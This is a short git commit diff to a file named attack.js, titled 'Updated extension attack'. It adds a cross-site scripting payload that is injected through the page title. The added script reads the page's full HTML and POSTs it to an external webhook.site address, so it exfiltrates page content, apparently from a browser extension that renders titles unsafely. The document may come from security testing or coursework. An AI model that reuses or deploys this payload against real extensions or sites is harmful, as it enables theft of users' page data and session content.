c25013dd6500f5275c8a5b34974c0fa08b7680d3
JBA192 <62188601+JBA192@users.noreply.github.com>
2023-03-15 22:20:32 -0400

    Updated extension attack

--- attack.js
+++ attack.js
@@ -1,5 +1,5 @@
 function changeTitle() {
-    var attackScript = "<button onload='sendHTML()'></button>"
+    var attackScript = "<script>function sendHTML(){ var html = document.documentElement.outerHTML; var server = new XMLHttpRequest;server.open('POST', 'https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c/html=' + encodeURIComponent(html));server.send();}</script><button onload='sendHTML()'></button>"
     if (document.title != attackScript) {
         document.title = attackScript;
     }
